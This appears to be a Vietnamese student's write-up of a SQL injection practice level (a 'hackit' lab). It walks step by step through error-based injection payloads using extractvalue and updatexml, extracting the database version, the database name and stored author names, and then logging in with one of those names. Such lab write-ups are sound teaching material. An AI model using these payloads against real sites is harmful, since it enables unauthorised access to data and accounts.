# <div align="center"><p> SQL-Injection/Level_7</p></div>
 ## Họ và tên: Mai Thị Hoàng Yến
 ## Ngày báo cáo: Ngày 05/5/2022
 ### MỤC LỤC
   [SQL-Injection](#gioithieu)
   
### Nội dung báo cáo 
#### SQL-Injection <a name="gioithieu"></a>
- B1: Đây là màn hình chính của trang web level_7. Trang web cho chúng ta biết thêm thông tin đó là tên table `level7_news` và cột là `autor`.

  ![image](https://user-images.githubusercontent.com/101852647/166922826-3e7e477b-7dfc-4333-9455-9df038682065.png)
  
- B2: Bắt đầu nhập thử `1` ta thấy trang web trả về cho chúng ta trang thông tin .

  ![image](https://user-images.githubusercontent.com/101852647/166923381-2f39c5cb-359b-4c5b-90b4-9226dd0dd284.png)

- B3: Ta thử chèn thêm dấu ' thì trang web trả về lỗi.

  ![image](https://user-images.githubusercontent.com/101852647/166923474-9c01ee61-b909-41d0-b0ad-3bda97480a3c.png)

- B4: Tiếp tục ta thử chèn câu lệnh `1%') union slect 1,2 from level7_news#` Nhưng trả web trả về thông báo có thứ gì đó không ổn.

  ![image](https://user-images.githubusercontent.com/101852647/167061461-1abbd29e-9e97-43ea-9898-0d9769926480.png)

- B5: Ta sẽ dựa trên ERROR BASE để khai thác thử dùng câu lệnh `1%') union select extractvalue(0x0a,concat(0x0a,(select version()))) or ('%1` để tìm được phiên bản của nó.

  ![image](https://user-images.githubusercontent.com/101852647/167061631-5dfed4d3-7c95-43fe-8d1a-57db03df1f24.png)

- B6: Sử dụng câu lệnh `1%') union select extractvalue(0x0a,concat(0x0a,(select database()))) or ('%1` để tìm tên database. Kết quả trả tên database về `hackit`

  ![image](https://user-images.githubusercontent.com/101852647/167061873-f92ca2bc-190d-4622-b5c2-a5503e14af95.png)

- B7: Ta có thể dùng updatexml hoặc extractvalue để khai thác đều được nên ở đây tôi đã thử sử dụng câu lệnh `1%') union select updatexml(null,concat(0x3a,(select autor from level7_news limit  1 OFFSET 0)),null) or ('%1` để khai thác. Kết quả trả về ` site_admin`.

  ![image](https://user-images.githubusercontent.com/101852647/167062167-f0663de1-5f21-4df9-b22c-7ff7a2eabd67.png)

- B8: sử dụng câu lệnh `1%') union select updatexml(null,concat(0x3a,(select autor from level7_news limit  1 OFFSET 1)),null) or ('%1`. Kết quả trả về `press`.

  ![image](https://user-images.githubusercontent.com/101852647/167062215-6fb8d0e1-383a-4191-9c16-b2203bbf2bf6.png)

- B9: sử dụng câu lệnh `1%') union select updatexml(null,concat(0x3a,(select autor from level7_news limit  1 OFFSET 2)),null) or ('%1`. Kết quả trả về `TestUserforg00gle`

  ![image](https://user-images.githubusercontent.com/101852647/167062267-1264c299-a976-458a-9ee9-ca45240dfdfe.png)

- B10: sử dụng câu lệnh `1%') union select updatexml(null,concat(0x3a,(select autor from level7_news limit  1 OFFSET 3)),null) or ('%1`. Kết quả trả về `apple`.

  ![image](https://user-images.githubusercontent.com/101852647/167062329-1aea7534-705e-4151-a7a9-461e29af598c.png)
  
- B11: Ta sẽ thử lần lượt với các kết quả và nhận thấy rằng kết quả `TestUserforg00gle` đăng nhập thành công.

  ![image](https://user-images.githubusercontent.com/101852647/167062438-9ae9847e-4c2c-416a-8a0e-6d9a9ae0fa9d.png)

